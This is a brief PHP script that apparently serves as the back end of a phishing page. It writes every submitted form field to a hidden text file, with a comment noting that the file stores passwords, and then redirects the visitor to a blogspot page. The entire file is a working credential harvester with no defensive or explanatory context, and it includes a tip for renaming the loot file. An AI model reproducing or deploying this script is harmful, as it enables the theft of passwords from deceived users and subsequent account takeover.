<?php
header ('Location:https://kudinyanakenyavideozasad.blogspot.com/me'); //Redirect user.
$handle = fopen("sdtgsdgsdgsderyeyreyer.txt", "a"); //You can rename the file you want to save the passwords.
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>